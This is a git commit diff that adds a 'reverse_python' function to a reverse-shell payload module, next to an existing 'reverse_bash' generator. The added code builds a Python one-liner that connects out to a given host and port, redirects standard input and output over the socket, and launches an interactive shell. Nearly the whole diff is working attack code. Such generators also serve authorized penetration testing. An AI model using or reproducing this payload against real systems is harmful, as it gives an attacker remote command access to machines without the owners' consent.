383aade80a5cac81b5df64cabf04d2592ad2b129
crypt0lith <118923461+crypt0lith@users.noreply.github.com>
2026-01-04 13:32:40 -0600

    add `reverse_python` payload

--- revshell/cmd/unix.py
+++ revshell/cmd/unix.py
@@ -1,4 +1,4 @@
-__all__ = ['reverse_bash']
+__all__ = ['reverse_bash', 'reverse_python']
 
 import random
 from shlex import quote
@@ -20,4 +20,24 @@ def reverse_bash(lhost: str, lport: int, *, bash_path="bash", shell_path="sh") -
                 ]
             )
         ),
+    )
+
+
+def reverse_python(lhost: str, lport: int, *, py_path="python3", shell_path="sh") -> str:
+    """Connect back and create a command shell via Python"""
+    py_path = py_path or 'python3'
+    shell_path = shell_path or '/bin/sh'
+    return "{0} -c {cmd}".format(
+        py_path,
+        cmd=quote(
+            ";".join(
+                [
+                    "import os,socket,subprocess",
+                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)",
+                    f's.connect(("{lhost}",{lport}))',
+                    "[os.dup2(s.fileno(),h) for h in (0,1,2)]",
+                    f'subprocess.call(["{shell_path}","-i"])',
+                ]
+            )
+        )
     )
